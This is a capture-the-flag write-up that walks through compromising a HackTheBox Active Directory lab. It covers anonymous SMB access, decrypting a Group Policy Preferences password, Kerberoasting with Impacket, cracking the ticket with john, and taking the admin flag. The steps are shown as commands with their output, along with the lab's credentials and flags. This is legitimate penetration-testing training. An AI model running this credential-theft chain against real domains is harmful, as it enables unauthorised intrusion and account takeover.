Today we will start our CREST CRT journey by completing the CREST CRT PATH on HackTheBox

Step 1:
Start target and spawn a pwnbox or your kali vm.

Step 2:
Let's start enumeration.

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ nmap -sV -sC $target -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-16 07:17 CDT
Nmap scan report for 10.129.37.127
Host is up (0.0079s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-16 12:18:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-05-16T12:19:18
|_  start_date: 2026-05-16T12:14:50
|_clock-skew: -1s
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
```

Biggest takeaways from this scan reveal that:
-this is a windows server that serves as domain controller for "active.htb"
-some common ports are open such as DNS(53), 88(Kerberos), 389(LDAP), 445(SMB), 464(Kerberos password change), 3268(LDAP Global Catalog)
-Windows Server 2008 R2 SP1

Task 1:
How many SMB shares are shared by the target?

Now we can use an smb enumeration client such as smbclient or smbmap

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ export target=10.129.37.127
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ echo $target
10.129.37.127
```

Now we can use $target as a variable in our syntax which will make it easier to follow along as we progress.

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ smbclient -L $target
Password for [WORKGROUP\ciupi]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Replication     Disk
	SYSVOL          Disk      Logon server share
	Users           Disk
```

No password login?? Skill issue...
This initial scan shows the answer to our first task.

Answer: 7

Task 2:
What is the name of the share that allows anonymous read access?

Remember earlier when I said we can use different tools for the same job? Well, smbmap also specifies permissions by default.

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ smbmap -H $target
[+] IP: 10.129.37.127:445	Name: 10.129.37.127
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
    ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	Replication                                       	READ ONLY
	SYSVOL                                            	NO ACCESS	Logon server share
	Users                                             	NO ACCESS
```

Answer: Replication

Moving on to task 3, we need to find out which file has encrypted account credentials in it?

Let's try first to see what is inside Replication share. As it is read only access, we can read the contents by using a smbclient. Just hit enter when you are prompted for a password or you can add -N flag for no password login.

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└──╼ [★]$ smbclient //$target/Replication
Password for [WORKGROUP\ciupi]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

		5217023 blocks of size 4096. 279268 blocks available
```

Let's just get everything that is in here and we will inspect it on our machine.

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└──╼ [★]$ smbclient //$target/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.7 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (4.0 KiloBytes/sec) (average 1.8 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (93.9 KiloBytes/sec) (average 24.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (17.4 KiloBytes/sec) (average 23.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (35.7 KiloBytes/sec) (average 25.4 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (121.2 KiloBytes/sec) (average 39.4 KiloBytes/sec)
```

After downloading the folder and taking a look inside it, normally you can use tree to inspect the folder in a more fashionable way, but we do not have it on our pwnbox. So we will get a bit creative and use the following.

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ find active.htb/ | sed 's|[^/]*/ |g'

 scripts
 DfsrPrivate
  Installing
  ConflictAndDeleted
  Deleted
 Policies
  {6AC1786C-016F-11D2-945F-00C04fB984F9}
   MACHINE
    Microsoft
     Windows NT
      SecEdit
       GptTmpl.inf
   GPT.INI
   USER
  {31B2F340-016D-11D2-945F-00C04FB984F9}
   MACHINE
    Registry.pol
    Preferences
     Groups
      Groups.xml
    Microsoft
     Windows NT
      SecEdit
       GptTmpl.inf
   Group Policy
    GPE.INI
   GPT.INI
   USER
```

If we take a look at Groups.xml file, we will find something interesting...

```
─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└──╼ [★]$ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

The cpassword value is an encrypted password for the user ID SVC_TGS and a quick google reveals that this is a GPP encryption. So let's do some further research and find out what our options are.

Answer: Groups.xml

Task 4: What is the decrpyted password for the SVC_TGS account?

It seems that GPP encryption uses a known algorithm for encryption and gpp-decryt could be the right tool for the job.

I installed this on my machine by runing

```
─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ pip install gpp-decrypt

┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ gpp-decrypt
usage: gpp-decrypt [-h] [-v] [--verbose] [--no-banner] (-f FILE | -c CPASS)
gpp-decrypt: error: one of the arguments -f/--file -c/--cpassword is required
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ gpp-decrypt -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

                              __                                __
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/
/___/  /_/    /_/                                /___/  /_/


[ • ] GPP-Decrypt v2.0.0 - Group Policy Preferences Password Decryptor
[ • ] Author: Kristof Toth (@t0thkr1s)

[ ✓ ] Decrypted password: GPPstillStandingStrong2k18ఌఌఌఌఌఌ
```

Doesn't really, does it?

Answer: GPPstillStandingStrong2k18

So far so good, we are getting closer to actually taking control of this Domain Controller.

Task 5: Submit the flag located on the security user's desktop.

Ok, now that we have some credentials, let's see first if we can actually read anythink else on the smb share.

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ smbmap -H $target -u SVC_TGS -p GPPstillStandingStrong2k18
[+] IP: 10.129.37.127:445	Name: 10.129.37.127
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	Replication                                       	READ ONLY
	SYSVOL                                            	READ ONLY	Logon server share
	Users                                             	READ ONLY
```

As we are aware that the flag is located on the user's Desktop, let's login and get that flag!

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ smbclient //$target/Users -U SVC_TGS --password 'GPPstillStandingStrong2k18'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 09:39:20 2018
  ..                                 DR        0  Sat Jul 21 09:39:20 2018
  Administrator                       D        0  Mon Jul 16 05:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
  Default                           DHR        0  Tue Jul 14 01:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
  Public                             DR        0  Mon Jul 13 23:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018

		5217023 blocks of size 4096. 279250 blocks available
smb: \> cd SVC_TGS\
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 10:16:32 2018
  ..                                  D        0  Sat Jul 21 10:16:32 2018
  Contacts                            D        0  Sat Jul 21 10:14:11 2018
  Desktop                             D        0  Sat Jul 21 10:14:42 2018
  Downloads                           D        0  Sat Jul 21 10:14:23 2018
  Favorites                           D        0  Sat Jul 21 10:14:44 2018
  Links                               D        0  Sat Jul 21 10:14:57 2018
  My Documents                        D        0  Sat Jul 21 10:15:03 2018
  My Music                            D        0  Sat Jul 21 10:15:32 2018
  My Pictures                         D        0  Sat Jul 21 10:15:43 2018
  My Videos                           D        0  Sat Jul 21 10:15:53 2018
  Saved Games                         D        0  Sat Jul 21 10:16:12 2018
  Searches                            D        0  Sat Jul 21 10:16:24 2018

		5217023 blocks of size 4096. 279250 blocks available
smb: \SVC_TGS\> cd Desktop\
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 10:14:42 2018
  ..                                  D        0  Sat Jul 21 10:14:42 2018
  user.txt                           AR       34  Sat May 16 07:15:44 2026

		5217023 blocks of size 4096. 279250 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)

┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ cat user.txt
8caa9c568e8f5c473e630467daa6907c
```

Ezpz lemon squeezy

Task 6: Which service account on Active is vulnerable to Kerberoasting?

Kerberoasting is an Active Directory attack that abuses how Kerberos authentication works to extract service account passwords offline and with this in mind, let's figure out which account is vulnerable.

We will use Impacket to interact with these low-level windows protocol. The kerberoasting tool from Impacket is GetUserSPNs.py

```
─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ GetUserSPNs.py -dc-ip $target active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2026-05-16 07:15:46.593737
```

Ok, this output confirms that we can request the Administrator's hash, so let's run this command again but this time we will request the user as well.

Answer: Administrator

Task 7: What is the plaintext password for the administrator account?

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ GetUserSPNs.py -dc-ip $target active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request-user Administrator
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2026-05-16 07:15:46.593737



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c05e3blablablabla...
```

Now just take the hash and store it in a txt file so we can try to bruteforce it.
We will use our trusty rockyou.txt file to attempt to crack this hash.

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ john passhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:05 DONE (2026-05-16 10:20) 0.1733g/s 1826Kp/s 1826Kc/s 1826KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Bingo, we got it! Now rinse and repeat.

We go back to our smbmap tool to see if we actually have admin privilege on this share.

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ smbmap -H $target -u Administrator -p Ticketmaster1968
[+] IP: 10.129.37.127:445	Name: 10.129.37.127
[\] Work[!] Unable to remove test directory at \\10.129.37.127\SYSVOL\CEOLHDSQAG, please remove manually
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C$                                                	READ, WRITE	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ, WRITE	Logon server share
	Replication                                       	READ ONLY
	SYSVOL                                            	READ, WRITE	Logon server share
	Users                                             	READ ONLY
```

Voilà! Now we have Admin privilege on the smb shares!

Answer: Ticketmaster1968

Task 8: Submit the flag located on the administrator's desktop.

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ smbclient //$target/Users --user Administrator --password Ticketmaster1968
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 09:39:20 2018
  ..                                 DR        0  Sat Jul 21 09:39:20 2018
  Administrator                       D        0  Mon Jul 16 05:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
  Default                           DHR        0  Tue Jul 14 01:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
  Public                             DR        0  Mon Jul 13 23:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018

		5217023 blocks of size 4096. 278961 blocks available
smb: \> cd Administrator\
smb: \Administrator\> ls
  .                                   D        0  Mon Jul 16 05:14:21 2018
  ..                                  D        0  Mon Jul 16 05:14:21 2018
  AppData                           DHn        0  Sat May 16 07:15:39 2026
  Application Data                DHSrn        0  Mon Jul 16 05:14:15 2018
  Contacts                           DR        0  Mon Jul 30 08:50:10 2018
  Cookies                         DHSrn        0  Mon Jul 16 05:14:15 2018
  Desktop                            DR        0  Thu Jan 21 10:49:47 2021
  Documents                          DR        0  Mon Jul 30 08:50:10 2018
  Downloads                          DR        0  Thu Jan 21 10:52:32 2021
  Favorites                          DR        0  Mon Jul 30 08:50:10 2018
  Links                              DR        0  Mon Jul 30 08:50:10 2018
  Local Settings                  DHSrn        0  Mon Jul 16 05:14:15 2018
  Music                              DR        0  Mon Jul 30 08:50:10 2018
  My Documents                    DHSrn        0  Mon Jul 16 05:14:15 2018
  NetHood                         DHSrn        0  Mon Jul 16 05:14:15 2018
  NTUSER.DAT                       AHSn   524288  Sat May 16 07:15:46 2026
  ntuser.dat.LOG1                   AHS   262144  Sat May 16 08:03:14 2026
  ntuser.dat.LOG2                   AHS        0  Mon Jul 16 05:14:09 2018
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf    AHS    65536  Mon Jul 16 05:14:15 2018
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Mon Jul 16 05:14:15 2018
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Mon Jul 16 05:14:15 2018
  ntuser.ini                         HS       20  Mon Jul 16 05:14:15 2018
  Pictures                           DR        0  Mon Jul 30 08:50:10 2018
  PrintHood                       DHSrn        0  Mon Jul 16 05:14:15 2018
  Recent                          DHSrn        0  Mon Jul 16 05:14:15 2018
  Saved Games                        DR        0  Mon Jul 30 08:50:10 2018
  Searches                           DR        0  Mon Jul 30 08:50:10 2018
  SendTo                          DHSrn        0  Mon Jul 16 05:14:15 2018
  Start Menu                      DHSrn        0  Mon Jul 16 05:14:15 2018
  Templates                       DHSrn        0  Mon Jul 16 05:14:15 2018
  Videos                             DR        0  Mon Jul 30 08:50:10 2018

		5217023 blocks of size 4096. 278961 blocks available
smb: \Administrator\> cd Desktop\
smb: \Administrator\Desktop\> ls
  .                                  DR        0  Thu Jan 21 10:49:47 2021
  ..                                 DR        0  Thu Jan 21 10:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 08:50:10 2018
  root.txt                           AR       34  Sat May 16 07:15:44 2026

		5217023 blocks of size 4096. 278961 blocks available
smb: \Administrator\Desktop\> get root.txt
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
```

Now we have the root flag downloaded on our machine. Sweet!

```
┌─[eu-dedivip-3]─[10.10.15.233]─[ciupi@htb-wsuajht6r2]─[~]
└──╼ [★]$ cat root.txt
a1d350292c2f0ca7ddf450b67179e35d

Answer: a1d350292c2f0ca7ddf450b67179e35d
```

To summarise, we progressed from initial network enumeration with Nmap to full domain compromise of the Active Directory environment.

The attack path began with anonymous SMB access, which exposed Group Policy Preferences (GPP) files containing a misconfigured encrypted credential. This allowed us to recover valid domain credentials for a service account.

Using these credentials, we enumerated Active Directory for Kerberos Service Principal Names (SPNs) and identified a vulnerable service account suitable for Kerberoasting. The resulting TGS ticket was extracted and successfully cracked offline, revealing the Administrator password.

With domain administrator access obtained, we were able to fully compromise the Domain Controller and retrieve the final flag.

This exercise highlights the security risks associated with legacy GPP credential storage and weak service account password practices, both of which can lead to full domain compromise when combined with Kerberos-based attacks such as Kerberoasting.

Adios!
